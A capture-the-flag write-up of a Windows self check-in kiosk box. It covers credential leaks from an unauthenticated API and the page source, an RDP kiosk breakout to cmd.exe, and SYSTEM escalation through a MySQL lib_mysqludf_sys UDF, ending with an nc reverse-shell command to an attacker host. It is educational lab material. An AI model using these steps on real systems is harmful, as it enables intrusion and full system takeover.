An airport self check-in kiosk whose **Nexion DeviceHub** management portal (TCP 8443) leaks its own device serial through an unauthenticated API, and that serial *is* the portal password. The authenticated dashboard hands over local Windows credentials in client-side content, which give an RDP session locked inside a fullscreen kiosk app. Breaking out of the kiosk through a device-error dialog yields a `cmd.exe` as `KioskUser` and the user flag. Privilege escalation abuses a **MySQL 8.0 service running as `LocalSystem`** combined with a weak ACL on its install directory: dropping a `lib_mysqludf_sys` DLL into the plugin folder and registering a UDF executes commands as `SYSTEM`.

## Reconnaissance & Enumeration

The objective of this phase was to map the exposed services, identify the entry point, and understand what kind of device I was looking at.

### Host Discovery

Reachability and an OS hint via ICMP:

```bash
ping -c 1 10.129.72.239
PING 10.129.72.239 (10.129.72.239) 56(84) bytes of data.
64 bytes from 10.129.72.239: icmp_seq=1 ttl=127 time=43.5 ms
```

A TTL of **127** points to a Windows host (default 128, decremented once across the routing hop).

### Port Scan

A full TCP scan with default scripts and version detection:

```bash
sudo nmap -p- -sCV 10.129.72.239 -oN nmap
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-title: Nexion DeviceHub - Login
|_Requested resource was /login
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-cors: GET POST PUT OPTIONS
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Four ports, and reading them together already sketches the whole engagement. **135 (MSRPC)** and **3389 (RDP)** are the usual Windows remote surfaces. **5985** is **WinRM** — remote PowerShell, interesting only once valid credentials exist. **8443** is the real starting point: a web application titled *Nexion DeviceHub - Login*. Everything about this layout says *get credentials from the web app, then use them on one of the remote-access services*.

Two details on 8443 are worth noting but are red herrings. The `http-trane-info` line (*Problem with XML parsing of /evox/about*) is the NSE script failing to fingerprint a Trane building-automation device — a false positive, not a real Trane endpoint. And the permissive `http-cors: GET POST PUT OPTIONS` tempts you toward a file-upload angle on the scanner API, which also leads nowhere.

The server header `Microsoft-HTTPAPI/2.0` on both 5985 and 8443 is informative too: this is a self-hosted application on Windows' `http.sys` stack, not IIS. There is no classic ASP.NET pipeline, so uploaded `.aspx` files would never be interpreted — worth internalising before wasting time on a webshell.

### Web Enumeration — Nexion DeviceHub (8443)

The machine itself provided a hint carried over from a sibling box:

> In the Layover machine, you uncovered a name and a booking confirmation code. Maybe they'll come in handy here? Jenny Crawford / KS7X2M

![Hint from the Layover machine: Jenny Crawford / KS7X2M](/assets/img/HTB/Touch/cap1.png)

This is a **dead end for the foothold**. The name/booking-code pair maps to a "booking lookup" feature inside the kiosk later on, not to the portal login, so I noted it and moved on rather than forcing it into the password field.

Content and API fuzzing against the portal:

```bash
wfuzz -c -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
      -u http://10.129.72.239:8443/FUZZ --hc 302
000000039:   200   2 L   124 W   3570 Ch   "login"
000001012:   403   0 L     2 W     35 Ch   "api"

wfuzz -c -w /usr/share/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
      -u http://10.129.72.239:8443/FUZZ --hc 302
000000093:   200   0 L     3 W    116 Ch   "api/status"
```

`/api` itself returned `403`, but the endpoint fuzz found `/api/status` returning `200` without any authentication. Reading it:

```bash
curl http://10.129.72.239:8443/api/status
{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online","uptime":65763}
```

The lesson here is to **read unauthenticated API responses closely**: this one discloses a device serial, `NX-DH-2024-B7042`. Embedded and vendor-management devices very frequently derive their default password from a device identifier — serial number, MAC, asset tag — so a disclosed serial is a credential candidate, not just metadata.

## Exploitation

### Serial-as-password authentication

The login form has a single **Device password** field (no username). Feeding it the serial from the status API worked on the first try:

```text
Device password: NX-DH-2024-B7042
```

![DeviceHub dashboard after authenticating with the device serial](/assets/img/HTB/Touch/cap2.png)

The dashboard is not the objective in itself — it's a pivot to something more useful. The device cards for the scanner and the printer show masked credential fields with a **show** control next to each.

### Client-side credential disclosure

A common assumption is that clicking **show** triggers an authenticated request to fetch the secret. In poorly built applications the secret has *already* been delivered to the browser and is merely hidden with HTML/CSS/JavaScript. That is exactly the case here — the reveal handler is wired with the plaintext value baked into the page:

```html
<tr><td class="label">Username</td><td class="mono">
  <span id="dpu1">••••••••</span>
  <span onclick="toggleCred('dpu1','KioskUser')">show</span></td></tr>
<tr><td class="label">Password</td><td class="mono">
  <span id="dpp1">••••••••</span>
  <span onclick="toggleCred('dpp1','K!0sk2026#')">show</span></td></tr>
```

![Printer device card revealing the KioskUser credentials client-side](/assets/img/HTB/Touch/cap3.png)

The credentials `KioskUser:K!0sk2026#` are present in the client-side content itself, no server round-trip required. Critically, the username `KioskUser` and the password format look like a **local Windows account**, not an application-only login — which means the remote-access services from the port scan are now in play.

### Choosing the right remote-access service

With a Windows credential in hand, the reflex is to test it against WinRM, RDP and anything else that authenticates. WinRM (5985) rejected it — `KioskUser` simply is not a member of the *Remote Management Users* group, so WinRM is not the intended route regardless of whether the password is valid. RDP (3389) is the way in. Note that the box has NLA disabled, so forcing standard RDP security avoids a TLS-negotiation failure:

```bash
xfreerdp /u:KioskUser /p:'K!0sk2026#' /v:10.129.72.239 /sec:rdp /cert:ignore +clipboard /dynamic-resolution
```

The session connected, but not to a normal desktop — the machine boots straight into a fullscreen **HTB Airways Self Check-in** kiosk application with the Windows shell hidden.

![RDP session landing inside the fullscreen self check-in kiosk](/assets/img/HTB/Touch/cap4.png)

### Kiosk breakout

A kiosk is a fullscreen application covering the desktop; the escape is almost always a dialog, a hyperlink or a file picker that reaches something capable of executing code. This box telegraphs the chain. The kiosk exposes a **Staff Login → Scan Badge** flow that depends on the passport scanner being online:

![Staff authentication screen asking to scan a badge](/assets/img/HTB/Touch/cap5.png)

The scanner can be disabled remotely from the DeviceHub portal on 8443 (the **Power Off** control on the Scanner page), which leaves it `OFFLINE`:

![Scanner page showing the device powered off / offline](/assets/img/HTB/Touch/cap6.png)

With the scanner down, triggering **Scan Badge** inside the kiosk raises a device-error dialog — and that dialog contains a clickable **support hyperlink**:

![Device error dialog with a clickable support link](/assets/img/HTB/Touch/cap7.png)

Clicking the link opens **Microsoft Edge**, which is a full application running *outside* the kiosk shell. The page fails to load (no internet on the box), but Edge itself is now open — the kiosk is broken:

![Microsoft Edge opened from the support link, breaking out of the kiosk](/assets/img/HTB/Touch/cap8.png)

From a browser, the classic escape to a shell is a native file dialog. Pressing `Ctrl+O` in Edge opens a Windows **Open** dialog; navigating to `C:\Windows\System32`, right-clicking `cmd.exe` and choosing **Open** launches a command prompt. *Run as administrator* would prompt for a password — `K!0sk2026#` does not work there — so a normal prompt is what we take:

![File open dialog in System32, right-clicking cmd.exe](/assets/img/HTB/Touch/cap9.png)

```text
C:\Windows\System32>whoami
kiosk-042\kioskuser
```

![cmd.exe running as kiosk-042\kioskuser](/assets/img/HTB/Touch/cap10.png)

## Privilege Escalation — `KioskUser` → `SYSTEM`

This is the core of the box and the part worth internalising, because it hinges entirely on how Windows decides *who can do what*. I'll build it up concept by concept.

### Reading the token: `whoami /all`

```text
PS C:\Users\KioskUser\Desktop> whoami /all

USER INFORMATION
----------------
User Name           SID
=================== ==============================================
kiosk-042\kioskuser S-1-5-21-2554513647-1216688035-3073314765-1002

GROUP INFORMATION
----------------------------------------------------------------
KIOSK-042\Printer Administrators       Alias  S-1-5-21-2554513647-1216688035-3073314765-1003
BUILTIN\Remote Desktop Users           Alias  S-1-5-32-555
BUILTIN\Users                          Alias  S-1-5-32-545
[...]
Mandatory Label\Medium Mandatory Level Label  S-1-16-8192

PRIVILEGES INFORMATION
----------------------
Privilege Name                State
============================= ========
SeChangeNotifyPrivilege       Enabled
SeUndockPrivilege             Disabled
SeIncreaseWorkingSetPrivilege Disabled
SeTimeZonePrivilege           Disabled
```

Two things to extract from this, and understanding both is the point.

**First, the privileges are a dead end.** `SeChangeNotifyPrivilege` is held by everyone by default (it's "bypass traverse checking", used to walk directory paths). The other three — undock, increase working set, change time zone — are cosmetic. What matters is what's *absent*: no `SeImpersonatePrivilege` (so no Potato-style token abuse), no `SeBackupPrivilege` / `SeRestorePrivilege` (no ACL-bypassing file read/write), no `SeDebugPrivilege`, no `SeLoadDriverPrivilege`. Combined with a **Medium** integrity level, the privilege-based escalation paths are closed. Ruling them out confidently is as valuable as finding the real path.

**Second, the groups hold the lead.** Every SID here is `S-1-5-<something>`; the structure encodes where the identity comes from.

> **Tangent — SIDs and RIDs.** A SID like `S-1-5-21-2554513647-1216688035-3073314765-1002` breaks into a machine (or domain) identifier — `S-1-5-21-2554513647-1216688035-3073314765` — followed by a **RID** (Relative Identifier), here `1002`. Built-in, well-known groups have short fixed SIDs that are identical on every Windows box: `BUILTIN\Users` is always `S-1-5-32-545`, `Remote Desktop Users` always `S-1-5-32-555`. A RID of **1000 or higher** on the *machine's own* SID means the account or group was **created locally on this host**. `KioskUser` is `-1002`; `Printer Administrators` is `-1003` — created back-to-back when the box was provisioned. A non-standard local group named by the box author is almost always the thread to pull, because it exists only to grant some permission the author wanted this user to have.

So `KIOSK-042\Printer Administrators` is the eye-catcher. Importantly, the group name is just flavour — "printer administrators" has nothing to do with the real escalation. What matters is the **ACL that group (or the account) carries**, which is what the rest of this section tracks down.

### Finding a `SYSTEM` process to abuse

The escalation pattern on Windows is: *get your code to run inside a process that is already `SYSTEM`*. You don't "become" `SYSTEM`; you make something that is already `SYSTEM` execute what you want. So the next question is which services run as `SYSTEM`. Enumerating services and their start account:

```text
C:\Users\KioskUser\Desktop>sc query
SERVICE_NAME: MySQL80
DISPLAY_NAME: MySQL 8.0
        STATE  : 4  RUNNING

C:\Users\KioskUser\Desktop>sc qc MySQL80
SERVICE_NAME: MySQL80
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        BINARY_PATH_NAME   : C:\MySQL\bin\mysqld.exe --defaults-file=C:\MySQL\my.ini MySQL80
        SERVICE_START_NAME : LocalSystem
```

`sc qc` reads a service's configuration. Two fields decide everything:

- **`SERVICE_START_NAME : LocalSystem`** — this is the account the service runs as, the Windows equivalent of `User=` in a systemd unit. `LocalSystem` *is* `NT AUTHORITY\SYSTEM`. So `mysqld.exe` already runs as `SYSTEM`, and anything it executes internally inherits that.
- **`BINARY_PATH_NAME : C:\MySQL\...`** — MySQL is installed at the root-level `C:\MySQL`, not under `C:\Program Files`. That is not cosmetic: `C:\Program Files` carries strict default ACLs (only admins and `SYSTEM` can write), whereas a hand-made folder off the drive root frequently inherits far looser permissions. First sign the write primitive might be real.

### The real write primitive — a weak ACL

Checking who can write to the MySQL tree, including its plugin directory:

```text
C:\> icacls C:\MySQL
C:\MySQL BUILTIN\Administrators:(I)(OI)(CI)(F)
         NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
         BUILTIN\Users:(I)(OI)(CI)(RX)
         NT AUTHORITY\Authenticated Users:(I)(M)
         NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

C:\MySQL\lib> icacls plugin
plugin   BUILTIN\Administrators:(I)(OI)(CI)(F)
         NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
         BUILTIN\Users:(I)(OI)(CI)(RX)
         NT AUTHORITY\Authenticated Users:(I)(M)
         NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
```

Here is the correction that matters for notes: the write primitive is **not** `Printer Administrators` — that group appears nowhere in these ACLs. The grant is to **`NT AUTHORITY\Authenticated Users`**, i.e. *any authenticated user on the box*, `KioskUser` included. The `Printer Administrators` group was a plausible-looking lead, but the actual misconfiguration is a loose ACL applied to the whole `C:\MySQL` tree. Always let the `icacls` output overrule the hunch.

> **Tangent — decoding `icacls` flags.** The letters in parentheses are two different things: inheritance flags and the permission itself.
> - `(I)` — **Inherited**: this ACE comes down from a parent folder (`C:\MySQL`), it isn't set directly here. That's why the identical entries appear on `C:\MySQL`, `\lib` and `\lib\plugin` — they cascade from the root.
> - `(OI)` — **Object Inherit**: *files* created inside inherit this ACE.
> - `(CI)` — **Container Inherit**: *subfolders* inherit this ACE.
> - `(IO)` — **Inherit Only**: this particular ACE does not apply to the folder itself, only to its children.
> - `(M)` — **Modify**: read + **write** + execute + delete.
>
> Putting the two `Authenticated Users` lines together: the first `(I)(M)` grants Modify on the plugin folder itself; the second `(I)(OI)(CI)(IO)(M)` propagates Modify to everything created inside it. Net result: `KioskUser` can **drop a file into `C:\MySQL\lib\plugin\`**. Compare with `BUILTIN\Users:(RX)` (read + execute only, no write) to see how unusual the `(M)` grant is — this single ACE is the entire vulnerability.

### Harvesting the MySQL credentials

Write access to the plugin folder is necessary but not sufficient — the UDF is loaded by *MySQL*, so I still need to connect to the database, which means credentials. A config file existed but was unreadable:

```powershell
PS C:\ProgramData\HTB Airways> type db-config.ini
type : Access to the path 'C:\ProgramData\HTB Airways\db-config.ini' is denied.
```

Access denied on the `.ini`, but a sibling batch script in the same folder was readable and carried the password in cleartext:

```text
C:\ProgramData\HTB Airways>type refresh-dates.bat
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul
```

That yields `root:HTB@irw4ys_DB!2026`. All four pieces are now present: MySQL runs as `SYSTEM`, the plugin directory is writable, there is a shell on the box, and the database credentials are in hand.

### Why the UDF route works (and why it needs no service restart)

MySQL can be extended with **User Defined Functions** — native functions written in C/C++, compiled into a shared library (`.dll` on Windows, exactly the Windows analogue of a Linux `.so`). When a library's function is called from SQL, MySQL executes that native code **inside its own process, with its own privileges**. That last clause is the whole attack: code inside a library loaded by `mysqld.exe` runs as `SYSTEM`.

The weaponised UDF is `lib_mysqludf_sys`, which exports `sys_exec()` / `sys_eval()` — functions that run an OS command. MySQL will only load UDF libraries from its configured **`plugin_dir`**, which is precisely the folder the weak ACL lets us write to.

A key subtlety worth capturing in notes: this needs **two independent permissions that people routinely conflate**:

1. **Write a file into `plugin_dir`** — an ACL on the *filesystem* (confirmed above).
2. **Control the MySQL service** (stop/start/restart) — an ACL on the *service object*, a completely separate security descriptor.

A low-privileged kiosk user has (1) but almost never (2) — and the elegance of the UDF technique is that **it needs only (1)**. The library is loaded *on demand* the instant you run `CREATE FUNCTION ... SONAME`, hot, with no restart. The intuition "copy the DLL and restart the service" mixes this up with other service-based privescs (binary replacement, unquoted service path) that *do* require a restart; the UDF does not, which is exactly why it works for an account that cannot touch the service.

### Dropping the UDF and executing as `SYSTEM`

With the DLL in `plugin_dir`, registering the function loads it into the `SYSTEM` process and a first command confirms execution context. Note the doubled backslashes — inside a SQL string literal `\` is an escape character:

```text
C:\MySQL\lib\plugin>C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -h 127.0.0.1 -e "CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys_64.dll';"

C:\MySQL\lib\plugin>C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -h 127.0.0.1 -e "SELECT sys_exec('whoami > C:\\Temp\\who.txt');"

0

C:\MySQL\lib\plugin>type \Temp\who.txt

```

`sys_exec` returns a status code (0), not stdout, so the command redirects its output to a file — which reads back `nt authority\system`. Execution as `SYSTEM` is confirmed. Promoting that to an interactive shell by re-using the `nc64.exe` already on the box:

```text
C:\MySQL\lib\plugin>C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -h 127.0.0.1 -e "SELECT sys_exec('C:\\Temp\\nc.exe <ATTACKER_IP> 4444 -e cmd.exe');"
```

## Key Takeaways

- **Unauthenticated API responses are credential sources, not just metadata.** The `/api/status` endpoint leaked a device serial that was also the portal password. On embedded and vendor-management devices, any disclosed identifier (serial, MAC, asset tag) should be tried as a default/derived credential before anything else.
- **"Show password" controls are frequently client-side theatre.** When a secret is masked in the browser, inspect the page source and the reveal handler before assuming a server round-trip. If the plaintext is already in the DOM or JavaScript, the masking is cosmetic and the credential is yours.
- **Match the credential to the right service, and don't read a rejection as "wrong password".** WinRM rejected a valid credential purely because the account lacked *Remote Management Users* membership. A failed WinRM/RDP check via one tool (e.g. NLA/TLS negotiation errors) is about the service configuration, not necessarily the password — confirm with an actual client before discarding creds.
- **Kiosk breakouts live in error dialogs, hyperlinks and file pickers.** The reliable escape is any UI element that reaches a browser, and from a browser any native file dialog (`Ctrl+O`) that can launch `cmd.exe`. Disabling a dependency (the scanner) to force an error dialog is a repeatable pattern for application-lockdown escapes.
- **On Windows, a service's `SERVICE_START_NAME` is the whole escalation question.** `sc qc <service>` revealing `LocalSystem` means any code you can get that service to execute runs as `SYSTEM`. Enumerating services by their run-as account should be reflexive on any Windows foothold.
- **`icacls` overrules the hunch.** A custom local group with a suggestive name (`Printer Administrators`) looked like the privesc vector, but the actual write primitive was an over-broad `Authenticated Users:(M)` ACE on `C:\MySQL`. Always confirm the concrete ACL on the target object instead of inferring from group names. Software installed off the drive root (`C:\MySQL`) routinely misses the strict ACLs that `C:\Program Files` enforces.
- **MySQL running as `SYSTEM` plus a writable `plugin_dir` is `lib_mysqludf_sys` territory.** The UDF loads on `CREATE FUNCTION` — hot, in-process, no service restart — so it only requires filesystem write to the plugin folder and valid DB credentials, never control over the service object. Don't confuse it with service-binary-replacement privescs that do need a restart.
- **Watch the architecture of native payloads.** A 32/64-bit mismatch between the UDF DLL and `mysqld.exe` fails with `errno 193`. Confirm the server's build (`SHOW VARIABLES LIKE '%version_compile_machine%'`) before choosing the library.
